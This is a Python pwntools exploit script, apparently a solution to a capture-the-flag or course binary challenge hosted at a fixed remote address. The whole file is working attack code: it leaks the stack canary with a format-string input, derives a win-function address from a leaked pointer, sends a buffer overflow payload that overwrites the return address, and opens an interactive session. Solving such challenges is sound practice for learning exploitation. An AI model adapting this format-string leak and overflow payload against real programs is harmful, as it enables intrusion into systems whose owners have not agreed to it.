from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug('./6', 
        gdbscript="""
        init-pwndbg
        b *vuln+46
        b *vuln+63
        b *vuln+75
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process('./6')

def solve(): 
    p = conn()
    
    if(args.REMOTE):
        p.sendline("13523032")
        p.sendline("6")

    # write your payload here
    offset = 104

    # Leak win function address
    log.info("Leaking the win function address...")
    vuln_addr = p.recvline(timeout=1)
    p.recvline(timeout=1)
    vuln_match = re.search(rb'0x[0-9a-fA-F]+', vuln_addr)  # Use regex to find a hex value
    vuln_addr = int(vuln_match.group(0), 16)
    win_addr = vuln_addr - 0x1a
    log.success(f"win function address: {hex(win_addr)}")
    
    # Leak canary value (17th on stack)
    log.info("Leaking the canary value...")
    p.sendline(b'%19$p')

    canary = None

    # Read the canary value
    try:
        log.info("Waiting for canary value...")
        canary_line = p.recvline(timeout=5).strip()

        # Extract the actual canary from the response
        match = re.search(rb'0x[0-9a-fA-F]+', canary_line)  # Use regex to find a hex value
        if match:
            canary = int(match.group(0), 16)  # Convert the matched hex string to an integer
            log.success(f"Leaked canary: {hex(canary)}")
        else:
            log.error(f"No valid canary found in line: {canary_line}")
            return

    except Exception as e:
        log.error(f"Failed to parse canary value: {e}")
        return

    payload = offset * b'A' + p64(canary) + b'B' * 8 + p64(win_addr)
    print(payload)

    p.sendline(payload)  # Inject payload into binary
    p.interactive()  # Flush to stdout 

solve()
